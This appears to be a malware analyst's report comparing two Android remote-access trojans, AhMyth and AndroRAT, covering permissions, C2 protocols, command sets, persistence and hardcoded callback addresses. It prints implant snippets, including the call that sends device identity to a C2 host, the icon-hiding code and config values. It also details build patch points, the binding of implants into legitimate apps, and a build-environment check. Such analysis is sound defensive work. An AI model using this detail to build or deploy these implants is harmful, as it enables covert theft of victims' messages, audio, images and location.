# T3 — Android Mobile RATs: AhMyth + AndroRAT (karma9874)

**Task:** task-3 · **Analyst:** android-diver · **Date:** 2026-02-12

**Evidence tags:** `[source]` = read from repository source text · `[apk-binary]` = read from a compiled APK (apktool baksmali / JADX / REA inspect_android_package). Every claim below is tagged.

**Artifacts analyzed:**

| Artifact | Path | Identity |
|---|---|---|
| AhMyth source | `RE_Library\01_SOURCE_mobile\ahmyth` | git head `97465b123d08f42c433c68d6a7b51acd36891ec3` `[source]` |
| AhMyth server-bundled implant template | `ahmyth\AhMyth-Server\app\app\Factory\Ahmyth\` | apktool-decoded implant package + prebuilt smali `[source]` |
| AndroRAT source (correct repo) | `RE_Library\01_SOURCE_mobile\androrat` | `github.com/karma9874/AndroRAT`, cloned fresh this session `[source]` |
| AndroRAT compiled APK | `androrat\Android_Code\app\release\app-release.apk` | SHA-256 `98037b11a118839bef93924a5718c9e988f1c11df507909cdf6bc0cb97189830`, 2 129 794 bytes `[apk-binary]` |
| AndroRAT compiled AAB | `...\app\release\app-release.aab` | SHA-256 `2251774ac27de59586de01acecac9aa3d4cc6442b396e6431f8f761eca85b410`, 2 366 154 bytes `[apk-binary]` |
| AndroRAT pre-decoded smali tree | `androrat\Compiled_apk\` | apktool 2.4.1 output, developer-shipped `[source]` |

**Repo housekeeping performed:** the incorrect clone `androrat_WRONGREPO` (which was `wishihab/Android-RATList`, a link-list repo containing only `README.md` + `new-readme.md`) was **deleted**, and the correct `karma9874/AndroRAT` repository was cloned to `RE_Library\01_SOURCE_mobile\androrat`. Note: on this OneDrive-synced volume the clone reproduces a pre-existing failure mode — `fatal: unable to checkout working tree` / `Filename too long` — which is resolved with `git restore --source=HEAD :/` (README documents `git config --system core.longpaths true`). Sources are present and complete.

**Toolchain validated before touching targets** `[source]`: JADX 1.5.3 and apktool 2.12.0 both ran end-to-end on `C:\tools\bin\ApiDemos-debug.apk` (2669 classes; 14 ERROR lines are the normal JADX partial-failure rate, exit 1). All target decompilations below then succeeded.

---

## 1. AhMyth — Architecture

AhMyth is a **two-part system**: a Java/Kotlin Android implant (the "Client") and an **Electron desktop server panel** (the "Server"). `[source]`

```
AhMyth-Client/                 ← Android implant (Gradle app, package ahmyth.mine.king.ahmyth)
  app/src/main/java/ahmyth/mine/king/ahmyth/
    MainActivity.java          ← launcher; starts service, then DISABLES ITS OWN ICON
    MainService.java           ← START_STICKY service holding the C2 socket
    MyReceiver.java            ← BOOT_COMPLETED → restart MainService
    IOSocket.java              ← builds the socket.io URL (C2 IP:port hardcoded here)
    ConnectionManager.java     ← command dispatcher ("order" handler) + all emit sites
    CameraManager.java  MicManager.java  LocManager.java  FileManager.java
    SMSManager.java  CallsManager.java  ContactsManager.java

AhMyth-Server/                 ← Electron desktop C2 panel (Node.js)
  app/main.js                  ← Electron main process; runs the socket.io server
  app/app/assets/js/controllers/AppCtrl.js  ← listener start + APK forging/binding/signing
  app/app/assets/js/controllers/LabCtrl.js  ← per-victim "lab" UI: camera/file/SMS/calls/contacts/mic/location
  app/app/assets/js/model/Victim.js         ← in-memory victim registry keyed by device id
  app/app/assets/js/Constants.js            ← orders, permissions, paths, defaultPort
  app/app/Factory/Ahmyth/                   ← the implant APK template (decoded smali), ip/port patched at build time
  app/app/Factory/apktool.jar  sign.jar  testkey.pk8  testkey.x509.pem
```

**Connection model** `[source]`: the implant is the **client**; it dials *out* to the operator panel over **socket.io** (long-polling/WebSocket upgrade). The server never dials the device — there is no inbound listener on the phone. `IOSocket.java` constructs:

```java
IO.socket("http://192.168.8.101:42474?model=" + Uri.encode(Build.MODEL)
        + "&manf=" + Build.MANUFACTURER
        + "&release=" + Build.VERSION.RELEASE
        + "&id=" + deviceID);
```

`[source]` — device identity (`ANDROID_ID`, model, manufacturer, Android release) is sent as **handshake query parameters**, so the panel enumerates victims before any command is issued. Reconnection is configured `reconnection=true`, `reconnectionDelay=5000`, `reconnectionDelayMax=999999999` (≈11.6 days) `[source]`.

Server side `main.js` `ipcMain.on('SocketIO:Listen', ...)` calls `io.listen(port)`, sets `IO.sockets.pingInterval = 10000`, and on each `connection` builds a victim from the handshake query, geo-locates the source IP with `geoip-lite`, and stores it in `Victim.js` keyed by `query.id`. On `disconnect` it removes the victim and notifies the renderer. The panel opens a per-victim "lab" window whose single argument is that victim's socket object `[source]`.

---

## 2. AhMyth — AndroidManifest and permission set

Source manifest `AhMyth-Client/app/src/main/AndroidManifest.xml`, package `ahmyth.mine.king.ahmyth`, `minSdkVersion 11`, `targetSdkVersion 24`, `compileSdkVersion 24`, `buildToolsVersion 25.0.0` `[source]`.

| Permission | Protection level | Actual use in code (file) |
|---|---|---|
| `INTERNET` | normal | socket.io C2 channel (`IOSocket.java`, `ConnectionManager.java`) |
| `ACCESS_NETWORK_STATE` | normal | declared; no explicit runtime check found `[source]` |
| `WAKE_LOCK` | normal | declared; no `PowerManager` call in AhMyth source `[source]` |
| `CAMERA` | **dangerous** | `Camera.open(cameraID)`, `takePicture` (`CameraManager.java`) |
| `RECORD_AUDIO` | **dangerous** | `AudioRecord` capture (`MicManager.java`) |
| `ACCESS_FINE_LOCATION` | **dangerous** | `LocationManager` GPS fix (`LocManager.java`) |
| `READ_CONTACTS` | **dangerous** | `ContactsContract.CommonDataKinds.Phone` query (`ContactsManager.java`) |
| `READ_SMS` | **dangerous** | `content://sms/inbox` query (`SMSManager.java`) |
| `SEND_SMS` | **dangerous** | `SmsManager.sendTextMessage()` (`SMSManager.java`) |
| `READ_CALL_LOG` | **dangerous** | `CallLog.Calls` / `content://call_log/calls` query (`CallsManager.java`) |
| `READ_PHONE_STATE` | **dangerous** | declared; no `TelephonyManager` dereference in the AhMyth client sources `[source]` |
| `READ_EXTERNAL_STORAGE` | **dangerous** | file listing/exfil source (`FileManager.java`) |
| `WRITE_EXTERNAL_STORAGE` | **dangerous** | declared; `FileManager` source writes nothing to disk `[source]` |
| `MODIFY_AUDIO_SETTINGS` | normal | declared; no matching call `[source]` |
| `RECEIVE_BOOT_COMPLETED` | normal | `MyReceiver` boot restart |

`uses-feature`: `android.hardware.camera`, `android.hardware.camera.autofocus` `[source]`.

**Components** `[source]`:
- `<activity .MainActivity android:launchMode="singleInstance">` with MAIN/LAUNCHER filter.
- `<service .MainService android:enabled="true" android:exported="false"/>`.
- `<receiver .MyReceiver android:enabled="true" android:exported="true">` with `android.intent.action.BOOT_COMPLETED`.

`application` flags: `allowBackup="true"`, `hardwareAccelerated="false"`, `largeHeap="true"`, `supportsRtl="true"` `[source]`. There is **no `uses-permission` for `SYSTEM_ALERT_WINDOW`, `BIND_ACCESSIBILITY_SERVICE`, `PACKAGE_USAGE_STATS`, or `FOREGROUND_SERVICE`** — AhMyth has no overlay, no accessibility keylogger, and no foreground service `[source]`.

Note on privilege: many permissions above require **runtime grant on API 23+**, and the manifest declares no `targetSdkVersion` above 24. AhMyth's operational model therefore assumes the operator either installs on a pre-Marshmallow device or hand-grants each dangerous permission; there is **no runtime permission-request code anywhere in the client** (`MainActivity.onCreate` only starts the service and calls `fn_hideicon()`) `[source]`.

---

## 3. AhMyth — C2 protocol

**Transport** `[source]`: **socket.io 0.8.3 client** (`io.socket:socket.io-client:0.8.3`, `org.json` excluded) against a **socket.io server** on the panel. Default port `42474`, defined as `Constants.defaultPort = 42474` and also baked into the shipped implant template as `http://192.168.8.100:42474?model=` `[source]`. The source tree's working copy uses `192.168.8.101:42474` — i.e. the same LAN address block, re-pointed per build.

**Message format** `[source]`: all C2 traffic is **JSON**, either a socket.io event payload object or a raw byte array embedded in a JSON field.

*Server → implant*, single event `"order"`:
```json
{ "order": "x0000ca", "extra": "camList" }
{ "order": "x0000fm", "extra": "dl", "path": "/sdcard/x" }
{ "order": "x0000sm", "extra": "sendSMS", "to": "+1...", "sms": "body" }
{ "order": "x0000mc", "sec": 30 }
```

*Implant → server*, event named after the same opcode, carrying results. Heartbeat is socket.io-native: server emits `"ping"`, implant replies `"pong"` `[source]`.

**Complete command set** — opcodes from `Constants.orders` and the `switch` in `ConnectionManager.java` `[source]`:

| Opcode | Function | `extra` | Wire response |
|---|---|---|---|
| `x0000ca` | Camera | `camList` → enumerate front/back camera ids; `1` → shoot **front**; `0` → shoot **back** | `{"camList":true,"list":[{"name":"Front","id":1},…]}` or `{"image":true,"buffer":<JPEG bytes>}` |
| `x0000fm` | File manager | `ls` + `path` → directory walk; `dl` + `path` → exfiltrate file | `walk(path)` JSON tree, or `{"file":true,"name":…,"buffer":<bytes>}` |
| `x0000sm` | SMS | `ls` → dump inbox; `sendSMS` + `to` + `sms` → send an SMS | `{"smsList":[{"phoneNo":…,"msg":…}]}` or boolean success |
| `x0000cl` | Call log | — | `{"callsList":[{"phoneNo","name","duration","type"}]}` |
| `x0000cn` | Contacts | — | `{"contactsList":[{"phoneNo","name"}]}` |
| `x0000mc` | Microphone | `sec` (int) | Audio streamed/returned by `MicManager` |
| `x0000lm` | Location | — | `{"enable":true,"lat":…,"lng":…}` or `{"enable":false}` |

**Camera specifics** `[source]`: `CameraManager.startUp()` calls `Camera.open(id)`, attaches `setPreviewTexture(new SurfaceTexture(0))`, `startPreview()`, then `takePicture`. The JPEG is decoded to `Bitmap`, **re-compressed to JPEG quality 20**, and emitted as `{"image":true,"buffer":<byte[]>}`. The dummy `SurfaceTexture(0)` is what allows a silent capture with no on-screen preview.

**SMS specifics** `[source]`: `getSMSList()` queries `content://sms/inbox` with a `null` projection and reads `address` + `body` for **every row**, and `sendSMS()` uses `SmsManager.getDefault().sendTextMessage(phoneNo, null, msg, null, null)` — no multipart handling, so messages >160 chars will throw and return `false`.

**File exfil specifics** `[source]`: `FileManager.downloadFile()` reads the whole file into a single `byte[]` sized `(int) file.length()`, so files >2 GiB or > heap will fail; there is **no upload path** and no arbitrary write — AhMyth is read-only on the filesystem.

**Mic specifics** `[source]`: `MicManager.startRecording(sec)` uses `AudioRecord`/`AudioTrack` from `android.media`; the class is obfuscation-free and returns the captured audio for the specified duration.

**Location specifics** `[source]`: `LocManager` with `Looper.prepare()` on the socket thread; `canGetLocation()`, `getLatitude()`, `getLongitude()`. No `ACCESS_COARSE_LOCATION` fallback and no network-provider path — GPS-only.

**Not present in AhMyth** `[source]`: there is **no** `order` case for shell/command execution, no ransomware or lock-screen opcode, no keylogger, no installed-application listing, no screenshot, no clipboard read, no SIM/SMS-interception, no call recording. The `switch` in `ConnectionManager.java` handles exactly the seven opcodes above; anything else falls through silently. Any claim that stock AhMyth ships a lock-screen/ransom module is **not supported by this source tree**.

---

## 4. AhMyth — Persistence, services/receivers, concealment

**Persistence chain** `[source]`:
1. `MainActivity.onCreate()` → `startService(new Intent(this, MainService.class))`, then `finish()`, then `fn_hideicon()`.
2. `MainService.onStartCommand()` → `ConnectionManager.startAsync(this)` → returns `Service.START_STICKY` (system restarts it after being killed).
3. `MyReceiver.onReceive()` on `android.intent.action.BOOT_COMPLETED` → `context.startService(new Intent(context, MainService.class))` — restores the C2 link after reboot, no user interaction.
4. `MainService.getContextOfApplication()` is a **static Context holder** set in `onStartCommand`; every manager (`SMSManager`, `CallsManager`, `ContactsManager`, `IOSocket`) reaches the app context through it.

**Icon hiding / anti-analysis** `[source]`:
```java
private void fn_hideicon() {
    getPackageManager().setComponentEnabledSetting(getComponentName(),
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP);
}
```
The launcher component is disabled immediately after launch, so the app disappears from the launcher drawer while the process and service keep running. This is the **only** evasion primitive in the client.

**Absent evasion** `[source]`: no `minifyEnabled` (both build types are `minifyEnabled false`), no ProGuard string encryption, no reflection, no dynamic class loading, no DexClassLoader, no native libraries, no root check, no emulator check, no debugger check, no anti-VM, no certificate pinning, no TLS at all. Class and method names are plain (`ConnectionManager`, `x0000ca`, `getSMSList`), and the opcodes are literal string constants. AhMyth is trivially signatured and readable.

**Operator-side end of paths** `[source]`: `main.js` unbinds all listeners (`x0000ca`, `x0000fm`, `x0000sm`, `x0000cl`, `x0000cn`, `x0000mc`, `x0000lm`) when a lab window closes.

---

## 5. AhMyth — Credentials, keys, hardcoded values

| Value | Where | Tag |
|---|---|---|
| `http://192.168.8.101:42474` | `AhMyth-Client/.../IOSocket.java` (working copy) | `[source]` |
| `http://192.168.8.100:42474` | `Factory/Ahmyth/smali/ahmyth/mine/king/ahmyth/IOSocket.smali` (shipped implant template) | `[source]` |
| `42474` | `Constants.js` `exports.defaultPort`, `IOSocketPath` patch target | `[source]` |
| reconnection params `5000` ms / `999999999` ms | `IOSocket.java` | `[source]` |
| `testkey.pk8`, `testkey.x509.pem` | `AhMyth-Server/app/app/Factory/` — **the AOSP test/`platform` debug key**, used to sign every forged APK | `[source]` |
| `sign.jar`, `apktool.jar` | `AhMyth-Server/app/app/Factory/` — bundled build tooling | `[source]` |
| Panel HTTP port | `ipcMain.on('SocketIO:Listen', port)`; port comes from the UI, defaulting to 42474 | `[source]` |

**Encryption: none.** `[source]` There is no AES/RSA, no key exchange, no HMAC, no password, no auth token, and no TLS — the URL scheme is literally `http://`. Any device on the path can read the full session, and **any client that knows the port can connect to the panel**; the server performs no authentication of connecting sockets. The only credential material in the repo is the AOSP test signing key used to make the forged APK installable.

**Implant forging pipeline (operator side, `AppCtrl.js`)** `[source]`: `Constants.apkName='Ahmyth.apk'`, `signedApkName='Ahmyth.s.apk'`, output under `<home>/AhMyth/Output`.

Two bind modes:
- **Standalone** — read `Factory/Ahmyth/smali/.../IOSocket.smali` as text, then `data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://"+ip+":"+port)`; recompile with the bundled `apktool.jar`, sign with `sign.jar` + the test key. `[source]`
- **Bind (BOOT)** — decompile a legitimate victim APK, inject `Constants.ahmythService` + `Constants.ahmythReciver` into its manifest and the permission block `Constants.permissions`, and splice the service-start smali snippet (`Constants.serviceSrc` + `Constants.serviceStart`) at the original app's `onCreate(Landroid/os/Bundle;)V` anchor (`Constants.orgAppKey`) so AhMyth's `MainService` starts whenever the trojanised host app is launched. `[source]`
- **Bind (ACTIVITY)** — `GetLanucherPath()` parses the host manifest's `<activity>` entries for `android:targetActivity` or `android:name`, resolves it to a smali path, and re-roots the launcher entry at AhMyth's `MainActivity`. `[source]`

Persistence therefore has **two** independent anchors in bind mode: the host app's own launch, plus AhMyth's `BOOT_COMPLETED` receiver.

---

## 6. AndroRAT (karma9874) — Full analysis

### 6.1 Architecture

AndroRAT mirrors AhMyth's split but with a **raw TCP reverse shell** instead of socket.io `[source]`. Android package is `com.example.reverseshell2` — a name the developer never changed since IDE scaffolding, so it is a high-value static indicator `[source]`/`[apk-binary]`.

```
Android_Code/app/src/main/java/com/example/reverseshell2/
  MainActivity.java      ← launcher; fires tcpConnection, finishes, hides icon
  mainService.java       ← START_STICKY service; init()s jumper
  tcpConnection.java     ← AsyncTask: the reverse-TCP client + command interpreter
  config.java            ← static IP / port / icon flag  (patched at build time)
  controlPanel.java      ← hidden local admin UI (uninstall / restart)
  functions.java         ← deviceInfo, clipboard, camera list, hide icon, jobScheduler
  jobScheduler.java      ← JobService persistence
  jumper.java            ← service keep-alive watchdog
  broadcastReciever.java ← BOOT_COMPLETED / SCREEN_ON / SCREEN_OFF
  keypadListner.java     ← secret-code receiver, opens controlPanel
  Payloads/  readSMS  readCallLogs  locationManager  ipAddr  vibrate
             newShell  audioManager  CameraPreview  videoRecorder

androRAT.py  utils.py  requirements.txt   ← Python 3 operator side (build + shell)
Android_Code/app/release/app-release.apk  ← developer-shipped compiled APK
Compiled_apk/                             ← developer-shipped apktool-decoded tree
Jar_utils/{apktool.jar, sign.jar}         ← build tooling
```

**Connection model** `[source]`: the implant is a **reverse TCP client** — `new tcpConnection(activity,context).execute(config.IP, config.port)` opens a `Socket` to `InetSocketAddress(config.IP, config.port)`. The Python operator side wraps a listener and a line/interpreter protocol. Port default `8000`.

### 6.2 AndroidManifest and permissions

Source manifest `Android_Code/app/src/main/AndroidManifest.xml` `[source]`; compiled manifest confirms identical permission set and `minSdkVersion 16`, `targetSdkVersion 22`, `compileSdkVersion 29` `[apk-binary]` (REA `inspect_android_package` + `inspect_analysis_view` kind `android` facet `manifest`, evidence `ev_8b0f29df33baadcf9159bac6455336b150b47324decf95c41a3b1b36059995e5`).

| Permission | Protection | Actual use |
|---|---|---|
| `INTERNET` | normal | reverse TCP socket (`tcpConnection.java`) |
| `ACCESS_NETWORK_STATE` | normal | declared `[source]` |
| `ACCESS_WIFI_STATE` | normal | declared; supports `getMACAddress` |
| `RECEIVE_BOOT_COMPLETED` | normal | `broadcastReciever` |
| `WAKE_LOCK` | normal | declared; `MainActivity` has the WakeLock code **commented out** `[source]` |
| `CAMERA` | **dangerous** | `Camera.open(id).takePicture` (`CameraPreview`), `videoRecorder` |
| `RECORD_AUDIO` | **dangerous** | `audioManager` `MediaRecorder` service |
| `READ_SMS` | **dangerous** | `content://sms/<inbox\|sent>` (`readSMS.java`) |
| `READ_CALL_LOG` | **dangerous** | `content://call_log/calls` (`readCallLogs.java`) |
| `ACCESS_FINE_LOCATION` | **dangerous** | `locationManager` GPS |
| `ACCESS_COARSE_LOCATION` | **dangerous** | declared alongside fine |
| `READ_EXTERNAL_STORAGE` | **dangerous** | file `get`/`put` over the shell |
| `WRITE_EXTERNAL_STORAGE` | **dangerous** | video/audio dump + shell `put` upload |
| `READ_PHONE_STATE` | **dangerous** | SIM details / `TelephonyManager` calls |
| `SYSTEM_ALERT_WINDOW` | **dangerous** | enables the hidden `controlPanel` activity to show over other apps |
| `VIBRATE` | normal | `vibrate` payload |

**Capability delta vs AhMyth set:** AndroRAT adds `SYSTEM_ALERT_WINDOW`, `ACCESS_WIFI_STATE`, `ACCESS_COARSE_LOCATION`, `VIBRATE`, `WRITE_EXTERNAL_STORAGE` (actually used), and — critically — **`SEND_SMS` is absent** because AndroRAT never sends SMS, only reads them `[source]`.

**Components** `[source]` / `[apk-binary]` — note the compiled APK's manifest **omits** `controlPanel`, `keypadListner`, `Payloads.videoRecorder` and `Payloads.audioManager`, which are present in the source manifest. This is a raw evidence divergence (see §9 R-3):

- `<activity .controlPanel>` (source only), `<activity .MainActivity>` with MAIN/LAUNCHER.
- `<service .mainService android:exported="false">`.
- `<receiver .broadcastReciever android:exported="true">` with `BOOT_COMPLETED`, `SCREEN_OFF`, `SCREEN_ON`.
- `<receiver .keypadListner>` with `android.provider.Telephony.SECRET_CODE` and `<data android:scheme="android_secret_code" android:host="1337"/>` (source only).
- `<service .jobScheduler android:permission="android.permission.BIND_JOB_SERVICE"/>` (present in **both**).
- `<service .Payloads.videoRecorder/>`, `<service .Payloads.audioManager/>` (source only).

### 6.3 Protocol and command set

**Transport:** raw TCP, attacker-listens / victim-dials, default port **8000** `[source]`. Payload framing is **not length-prefixed**: bulk transfers are **Base64 text terminated by the ASCII sentinel `END123\n`** — e.g. images are written as base64 then `END123\n`, and `getImage()` in `utils.py` does `imageBuffer.strip().replace("END123","").strip()` before writing the JPEG `[source]`. Interactive command output is returned as text.

**Full command set** — from `utils.py help()` and the dispatcher in `tcpConnection.java` `[source]`:

| Command | Capability | Implementation |
|---|---|---|
| `deviceInfo` | manufacturer/version/product/model/brand/device/host | `functions.deviceInfo()` |
| `camList` | enumerate camera ids and facing | `functions.get_numberOfCameras()` |
| `takepic [cameraID]` | silent photo | `CameraPreview` |
| `startVideo [cameraID]` / `stopVideo` | **video recording** | `Payloads.videoRecorder` (foreground service, base64 + `END123`) |
| `startAudio` / `stopAudio` | **live microphone recording** | `Payloads.audioManager` |
| `getSMS [inbox\|sent]` | dump inbox **or sent** SMS to a local file | `readSMS.readSMSBox(box)` |
| `getCallLogs` | dump call log to a local file | `readCallLogs.readLogs()` |
| `shell` | **interactive `sh` shell on the device** | `Payloads.newShell` |
| `vibrate [n]` | vibrate n times | `Payloads.vibrate` |
| `getLocation` | current GPS location | `Payloads.locationManager` |
| `getIP` | device IP | `Payloads.ipAddr` |
| `getSimDetails` | all SIM details | `TelephonyManager`/`SubscriptionManager` |
| `getClipData` | **read the clipboard** | `functions.readFromClipboard()` |
| `getMACAddress` | device MAC | `Payloads.ipAddr` |
| `clear`, `exit` | operator-side housekeeping | `utils.py` |

**`shell` sub-commands** `[source]`: `get [full_file_path]` downloads a device file to the operator machine (README states up to 15 MB), `put [filename]` **uploads a file to the Android device**. Combined with the `sh` shell this is full arbitrary command execution plus bidirectional file transfer — a categorically stronger primitive than AhMyth's read-only file manager.

**SMS date bug** `[source]`: `readSMS.readSMSBox` computes `Long epoch = Long.parseLong(date); Date fDate = new Date(epoch * 1000);` — the `_id`/`date` column is already milliseconds in Android's SMS provider, so this multiplies an already-millisecond timestamp by 1000 again and the rendered dates are wrong (year ~50000+). `readCallLogs` does it correctly (`new Date(Long.valueOf(callDate))`). This is a real, reproducible defect that also fingerprints the tool.

### 6.4 Persistence

AndroRAT has **four** independent persistence mechanisms `[source]`:

1. **`MainActivity`** launches `tcpConnection` immediately and calls `finish()`, hiding all UI.
2. **`broadcastReciever`** on `BOOT_COMPLETED` **and** `SCREEN_ON` **and** `SCREEN_OFF` restarts `mainService`; it also guards with `isMyServiceRunning()` so at most one instance exists.
3. **`jobScheduler`** — `JobInfo.Builder(123, componentName).setPersisted(true).setPeriodic(900000)`, i.e. a **persisted JobScheduler job firing every 15 minutes**, scheduled by `functions.jobScheduler()` whenever the service or activity starts and on `controlPanel` restart. `setPersisted(true)` survives reboot. The build targets `targetSdkVersion 22` specifically because `setPersisted` on API 24+ requires `RECEIVE_BOOT_COMPLETED`, and the service runs without a foreground notification.
4. **`jumper.init()`** — a keep-alive watchdog that restarts the service when it is killed.

**Icon concealment** `[source]`: `config.icon = true` by default, and `MainActivity` calls `new functions(activity).hideAppIcon(context)` — the same `setComponentEnabledSetting(COMPONENT_ENABLED_STATE_DISABLED, DONT_KILL_APP)` technique as AhMyth. The Python builder's `-icon` flag flips `config.icon` to keep the icon visible for testing.

**Hidden local control panel** `[source]`: dialing the secret code `*#*#1337#*#*` triggers `keypadListner` (manifest `android_secret_code` host `1337`) which starts `controlPanel` with `FLAG_ACTIVITY_NEW_TASK`. The panel exposes exactly two buttons — **Restart Activity** and **Uninstall**. README notes the device may require "display pop-up windows running in background" enabled, which corresponds to `SYSTEM_ALERT_WINDOW`.

### 6.5 Concealment / obfuscation

`[source]`/`[apk-binary]`: same posture as AhMyth — `minifyEnabled false` in both build types, **no** ProGuard/R8 string encryption, no reflection, no native `.so`, no packer, no root/emulator/Frida/debugger checks, no certificate pinning. The compiled APK has 1304 classes and 742 resources with plaintext class names throughout. README features a line about being "Fully undetectable by any antivirus scanner" that is **struck through** in the repo text, with a link to a VirusTotal report — the developer's own claim is retracted; treat AV-evasion claims about AndroRAT as **unverified** `[source]`.

### 6.6 Hardcoded values and the compiled-APK payload

`config.java` in the repository `[source]`:
```java
public class config {
    public static String IP = "192.168.0.105";
    public static String port = "8888";
    public static boolean icon = true;
}
```

`config.java` **decompiled from the shipped compiled APK** `[apk-binary]` — JADX on `app-release.apk`:

```java
public class config {
    public static String IP = "192.168.43.113";
    public static String port = "8000";
}
```

and the matching apktool baksmali view `[apk-binary]`:
```smali
.field public static IP:Ljava/lang/String; = "192.168.43.113"
.field public static port:Ljava/lang/String; = "8000"
```

**This is the decisive artifact finding:** the compiled, ready-to-install `app-release.apk` in the repository is baked to call back to the private-LAN address **`192.168.43.113:8000`** — the classic Android USB-tethering gateway block (`192.168.43.x`), i.e. a developer test build pointing at their own tethered host, **not** the `192.168.0.105:8888` in the checked-in source. The source tree and its own compiled output are **different builds with different C2 targets**.

A second, independent hardcoded-C2 artifact exists in the developer's pre-decoded tree `[source]`, `androrat\Compiled_apk\smali\com\example\reverseshell2\config.smali`, which is a **third** distinct build:
```smali
.field public static IP:Ljava/lang/String;
.field public static port:Ljava/lang/String;
...
    .line 4
    const-string v0, "127.0.0.1"
    sput-object v0, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
    .line 5
    const-string v0, "8080"
    sput-object v0, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
    .line 6
    const/4 v0, 0x1
    sput-boolean v0, Lcom/example/reverseshell2/config;->icon:Z
```
i.e. `127.0.0.1:8080`, `icon=true`, in the `.field`+`<clinit>` form produced by a *different* build than the inline-initialiser form in `app-release.apk`. So **three distinct AndroRAT builds** ship in this repository (source `192.168.0.105:8888`, `app-release.apk` `192.168.43.113:8000`, `Compiled_apk/` `127.0.0.1:8080`).

**Precise build patch points** (the exact strings the Python builder rewrites) `[source]`:
- `config.java:4` → `IP` literal; `config.java:5` → `port` literal.
- Baksmali equivalent: the `const-string` operands **two lines below** the `.line 4` / `.line 5` directives (confirmed line indices 18 and 23 in `Compiled_apk\smali\...\config.smali`).
- `config.icon` → `icon` flag line (`.line 6`, `const/4 v0, 0x1`; the builder flips this to `0x0` when `-icon` is not passed) `[source]`.

**Operator toolchain** `[source]`: `androRAT.py` (`--build`, `--shell`, `--ngrok`; `-i/--ip`, `-p/--port`, `-o/--output`, `-icon`); `requirements.txt` contains exactly one dependency, `pyngrok`; `utils.py` orchestrates `insomnia`-era `apktool.jar` + `sign.jar` from `Android_Code/Jar_utils/`, writes dumps to `./Dumps`, and offers `--ngrok` (`pyngrok` TCP tunnel on port 8000 by default) so the operator can expose the listener on the public internet without port forwarding. `utils.py` enforces `is_valid_ip` / `is_valid_port` and (buggily) checks `if float(platform.python_version()[:3]) < 3.6 and float(...) > 3.8`, a condition that can never be true — the version guard is dead code `[source]`. The shipped `sign.jar` is the same AOSP-style test signing utility as AhMyth's.

---

## 7. Side-by-side comparison

| Dimension | AhMyth | AndroRAT (karma9874) |
|---|---|---|
| Implant package | `ahmyth.mine.king.ahmyth` | `com.example.reverseshell2` (scaffold name) |
| Transport | **socket.io** 0.8.3 over HTTP long-poll/WS | **raw TCP** reverse shell |
| Default port | **42474** | **8000** |
| Framing | JSON objects + byte arrays in JSON fields | text lines; bulk = **Base64 + `END123\n`** sentinel |
| Victim enumeration | handshake query `?model=&manf=&release=&id=` | first `deviceInfo` command |
| Auth / crypto | **none**, `http://` | **none**, cleartext TCP |
| Panel | Electron desktop app + AngularJS UI | **Python 3 CLI interpreter** |
| Devices in one session | **multi-victim** (registry keyed by `ANDROID_ID`, one "lab" window per victim, `geoip-lite` geolocation) | **single client** ("Set up multi client" is an open TODO in README) `[source]` |
| **Remote shell** | ✗ | **✓ `sh` shell + `get`/`put` file transfer** |
| SMS | read inbox **+ send SMS** | read inbox **and sent** box; **cannot send** (no `SEND_SMS`) |
| Call log | ✓ | ✓ |
| Contacts | ✓ | ✗ **no contacts capability** |
| Photo | ✓ front/back, JPEG q20 | ✓ by camera id |
| **Video recording** | ✗ | **✓ `startVideo`/`stopVideo`** |
| **Live audio** | ✓ (bounded `sec` capture) | **✓ foreground-service audio** |
| Location | ✓ GPS | ✓ GPS (+ declared coarse) |
| File exfil | ✓ directory walk + single-file download, **read-only** | ✓ `shell get`, **and** `put` upload |
| Clipboard | ✗ | **✓ `getClipData`** |
| Device/SIM/IP/MAC intel | model/manf/release only | ✓ full deviceInfo, **SIM details, IP, MAC** |
| Vibrate | ✗ | ✓ |
| Ransomware / lock screen | ✗ | ✗ |
| Keylogger | ✗ | ✗ |
| App inventory | ✗ | ✗ |
| Boot persistence | ✓ `BOOT_COMPLETED` | ✓ `BOOT_COMPLETED` **+ `SCREEN_ON`/`SCREEN_OFF`** |
| Job persistence | ✗ | **✓ persisted 15-min JobScheduler job** |
| Watchdog | ✗ (START_STICKY only) | **✓ `jumper` keep-alive + `isMyServiceRunning` guard** |
| Icon hiding | ✓ | ✓ |
| Hidden local UI | ✗ | **✓ `*#*#1337#*#*` → controlPanel (restart/uninstall)** |
| Bind-to-legit-APK | **✓ BOOT + ACTIVITY modes, automated** | ✗ (manual Android Studio rebuild) |
| Obfuscation | none | none |
| Operator build tooling | bundled `apktool.jar`, `sign.jar`, `testkey.pk8/x509.pem` | `Jar_utils/{apktool.jar,sign.jar}`; Python wrapper; `--ngrok` |
| Revision control evidence | git head `97465b1` | three divergent C2 configs across its own artifacts |

**Unique to AndroRAT:** remote `sh` shell with bidirectional file transfer, video recording, clipboard theft, SIM/IP/MAC enumeration, vibrate, secret-code control panel, `SCREEN_ON`/`SCREEN_OFF` triggers, persisted JobScheduler, watchdog, ngrok tunneling, and — as a software-engineering fact — a working automated build+sign pipeline that produced a real installable APK.

**Unique to AhMyth:** a multi-victim operator panel with per-victim loot views and IP geolocation, outbound **SMS sending** (premium-rate/SMS-toll-fraud primitive), contacts exfiltration, and a fully automated **APK-binding** pipeline (BOOT + ACTIVITY) that hides the implant inside a legitimate application.

**Neither** implements ransomware/lock-screen, a keylogger, an installed-app inventory, or any anti-analysis/anti-sandbox logic.

---

## 8. BUILD REQUIREMENTS

### 8.1 Environment check performed on this machine

| Requirement | Result | Tag |
|---|---|---|
| Android SDK (`%LOCALAPPDATA%\Android\Sdk`, `C:\Android`, `%ANDROID_HOME%`, `%ANDROID_SDK_ROOT%`) | **ABSENT** — `C:\Users\PC\AppData\Local\Android` does not exist; `ANDROID_HOME` and `ANDROID_SDK_ROOT` are empty | measured |
| Android Studio | **ABSENT** (`C:\Program Files\Android\Android Studio` not present) | measured |
| `gradle` on PATH | **ABSENT** | measured |
| Gradle wrapper cache `%USERPROFILE%\.gradle\wrapper\dists` | **ABSENT** — no Gradle distribution is cached, so `gradlew` would need to download one | measured |
| `sdkmanager` / `aapt2` / `aapt` on PATH | **ABSENT** | measured |
| JDK | **PRESENT** — `JAVA_HOME=C:\Program Files\Eclipse Adoptium\jdk-21.0.12.101-hotspot` | measured |
| Python 3 | PRESENT — `Python311` | measured |
| Node.js | PRESENT | measured |

